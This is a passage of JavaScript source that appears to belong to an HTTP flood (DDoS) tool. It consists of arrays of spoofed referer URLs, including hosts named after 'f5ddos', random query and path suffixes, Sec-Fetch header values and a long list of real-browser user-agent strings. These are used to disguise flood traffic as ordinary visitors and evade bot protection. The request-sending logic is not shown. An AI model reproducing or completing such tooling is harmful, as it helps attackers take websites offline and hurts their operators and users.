     "http://engadget.search.aol.com/search?q=",
     "http://engadget.search.aol.com/search?q=query?=query=&q=",
     "http://eu.battle.net/wow/en/search?q=",
     "http://filehippo.com/search?q=",
     "http://funnymama.com/search?q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
     "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
     "http://go.mail.ru/search?mail.ru=1&q=",
     "http://help.baidu.com/searchResult?keywords=",
     "http://host-tracker.com/check_page/?furl=",
     "http://itch.io/search?q=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://jobs.bloomberg.com/search?q=",
     "http://jobs.leidos.com/search?q=",
     "http://jobs.rbs.com/jobs/search?q=",
     "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
     "http://louis-ddosvn.rhcloud.com/f5.html?v=",
     "http://millercenter.org/search?q=",
     "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
     "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
     "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
     "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
     "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
     "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
     "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
     "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
     "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
     "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
     "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
     "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
     "http://search.aol.com/aol/search?q=",
     "http://taginfo.openstreetmap.org/search?q=",
     "http://techtv.mit.edu/search?q=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://vk.com/profile.php?redirect=",
     "http://www.ask.com/web?q=",
     "http://www.baoxaydung.com.vn/news/vn/search&q=",
     "http://www.bestbuytheater.com/events/search?q=",
     "http://www.bing.com/search?q=",
     "http://www.evidence.nhs.uk/search?q=",
     "http://www.google.com/?q=",
     "http://www.google.com/translate?u=",
     "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
     "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
     "http://www.pagescoring.com/website-speed-test/?url=",
     "http://www.reddit.com/search?q=",
     "http://www.search.com/search?q=",
     "http://www.shodanhq.com/search?q=",
     "http://www.ted.com/search?q=",
     "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
     "http://www.usatoday.com/search/results?q=",
     "http://www.ustream.tv/search?q=",
     "http://yandex.ru/yandsearch?text=",
     "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
     "http://ytmnd.com/search?q=",
     "https://add.my.yahoo.com/rss?url=",
     "https://careers.carolinashealthcare.org/search?q=",
     "https://check-host.net/",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "https://drive.google.com/viewerng/viewer?url=",
     "https://duckduckgo.com/?q=",
     "https://google.com/",
     "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
     "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
     "https://help.baidu.com/searchResult?keywords=",
     "https://play.google.com/store/search?q=",
     "https://pornhub.com/",
     "https://r.search.yahoo.com/",
     "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
     "https://steamcommunity.com/market/search?q=",
     "https://vk.com/profile.php?redirect=",
     "https://www.bing.com/search?q=",
     "https://www.cia.gov/index.html",
     "https://www.facebook.com/",
     "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
     "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
     "https://www.fbi.com/",
     "https://www.google.ad/search?q=",
     "https://www.google.ae/search?q=",
     "https://www.google.al/search?q=",
     "https://www.google.co.ao/search?q=",
     "https://www.google.com.af/search?q=",
     "https://www.google.com.ag/search?q=",
     "https://www.google.com.ai/search?q=",
     "https://www.google.com/search?q=",
     "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
     "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
     "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
     "https://www.npmjs.com/search?q=",
     "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
     "https://www.pinterest.com/search/?q=",
     "https://www.qwant.com/search?q=",
     "https://www.ted.com/search?q=",
     "https://www.usatoday.com/search/results?q=",
     "https://www.yandex.com/yandsearch?text=",
     "https://www.youtube.com/",
     "https://yandex.ru/"
 ];
 const querys = [
     "", 
     "&", 
     "", 
     "&&", 
     "and", 
     "=", 
     "+", 
     "?"
 ];
 const pathts = [
     "?s=", 
     "/?", 
     "?q=", 
     "*",
     "",
     "/",
     "?true=", 
     "?"
 ];
 const platforms = [
    "Windows",
    "Macintosh",
    "Linux",
    "iOS",
    "Android",
    "PlayStation 4",
    "iPhone",
    "iPad",
    "Other"
    ];
 dest_header = [
        'audio',
        'document',
        'embed',
        'empty',
        'font',
        'frame',
        'iframe',
        'manifest',
        'paintworklet',
        'report',
        'script',
        'serviceworker',
        'sharedworker',
        'style',
        'video',
        'worker',
        'xslt',
    ];
    mode_header = [
        'cors',
        'navigate',
        'no-cors',
        'same-origin',
        'websocket'
    ];
    site_header = [
        'cross-site',
        'same-origin',
        'same-site',
        'none'
    ];
 const uap = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.85.1 YaSearchBrowser/21.85.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.3.940 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
    'Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 OPR/70.0.3728.178',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.116 YaApp_Android/22.11.1 YaSearchBrowser/22.11.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.186',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HONORHRY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.5.121.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.11.7.183.10 SA/3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.742 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.113.1 YaSearchBrowser/21.113.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.8.3.966.10 SA/3 TA/2.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; BV6800Pro_RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/19.5.2.38.10 YaApp_iOS/87.00 YaApp_iOS_Browser/87.00 Safari/604.1 SA/3 TA/2.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.727 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.82.1 YaSearchBrowser/21.82.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 Instagram 210.0.0.28.71 Android (30/11; 280dpi; 720x1526; lenovo/Lenovo; Lenovo K12 Pro; cebu; qcom; ru_RU; 326153491)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.172 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.56.1 YaSearchBrowser/21.56.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.730 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.3.120.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-N980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 YaBrowser/21.6.6.55.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 9; ZB602KL Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; M2010J19SG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.114.1 YaSearchBrowser/21.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.0.1996 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.51.1 YaSearchBrowser/21.51.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MagnitApp_iOS/2.0.9',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.54.1 YaSearchBrowser/21.54.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.620 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm; Android 10; AQM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 YaBrowser/21.8.1.138.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MagnitApp_iOS/1.4.9',
    'Mozilla/5.0 (Linux; arm; Android 10; AKA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.117.1 YaSearchBrowser/21.117.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.4.119.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 YaBrowser/21.8.1.127.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.616 Yowser/2.5 Safari/537.36',
